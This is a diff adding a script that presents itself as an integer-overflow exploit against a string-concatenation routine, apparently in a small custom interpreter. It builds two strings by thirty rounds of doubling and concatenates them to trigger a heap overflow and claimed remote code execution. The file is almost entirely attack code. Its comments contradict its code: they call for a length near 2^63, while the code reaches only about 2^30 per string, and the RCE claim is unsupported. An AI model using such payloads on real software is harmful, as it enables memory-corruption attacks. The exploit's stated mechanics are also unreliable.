@@ -1,0 +1,119 @@
+# RCE Payload: String Concatenation Integer Overflow Exploit
+# 
+# This payload attempts to exploit the integer overflow in string concatenation
+# to cause heap buffer overflow and potential RCE.
+#
+# Strategy: Build up strings via repeated concatenation, then trigger overflow
+
+# Build string s1 by repeated concatenation
+# Each iteration roughly doubles the length
+string s1 = "A";
+string s2 = "B";
+
+# Concatenate repeatedly to build up length
+# After N iterations, length ≈ 2^N
+# We need length ≈ 0x8000000000000000 to trigger overflow
+
+# Iteration 1: length = 2
+s1 = s1 + s1;
+# Iteration 2: length = 4
+s1 = s1 + s1;
+# Iteration 3: length = 8
+s1 = s1 + s1;
+# Iteration 4: length = 16
+s1 = s1 + s1;
+# Iteration 5: length = 32
+s1 = s1 + s1;
+# Iteration 6: length = 64
+s1 = s1 + s1;
+# Iteration 7: length = 128
+s1 = s1 + s1;
+# Iteration 8: length = 256
+s1 = s1 + s1;
+# Iteration 9: length = 512
+s1 = s1 + s1;
+# Iteration 10: length = 1024
+s1 = s1 + s1;
+# Iteration 11: length = 2048
+s1 = s1 + s1;
+# Iteration 12: length = 4096
+s1 = s1 + s1;
+# Iteration 13: length = 8192
+s1 = s1 + s1;
+# Iteration 14: length = 16384
+s1 = s1 + s1;
+# Iteration 15: length = 32768
+s1 = s1 + s1;
+# Iteration 16: length = 65536
+s1 = s1 + s1;
+# Iteration 17: length = 131072
+s1 = s1 + s1;
+# Iteration 18: length = 262144
+s1 = s1 + s1;
+# Iteration 19: length = 524288
+s1 = s1 + s1;
+# Iteration 20: length = 1048576
+s1 = s1 + s1;
+# Iteration 21: length = 2097152
+s1 = s1 + s1;
+# Iteration 22: length = 4194304
+s1 = s1 + s1;
+# Iteration 23: length = 8388608
+s1 = s1 + s1;
+# Iteration 24: length = 16777216
+s1 = s1 + s1;
+# Iteration 25: length = 33554432
+s1 = s1 + s1;
+# Iteration 26: length = 67108864
+s1 = s1 + s1;
+# Iteration 27: length = 134217728
+s1 = s1 + s1;
+# Iteration 28: length = 268435456
+s1 = s1 + s1;
+# Iteration 29: length = 536870912
+s1 = s1 + s1;
+# Iteration 30: length = 1073741824
+s1 = s1 + s1;
+
+# Build s2 similarly
+s2 = "B";
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+
+# Now concatenate s1 + s2
+# If lengths are large enough, this will overflow:
+# len1 + len2 wraps to small value
+# malloc allocates tiny buffer
+# strcpy/strcat write past end → heap overflow → RCE
+string result = s1 + s2;
+
+print("Exploit triggered");
+
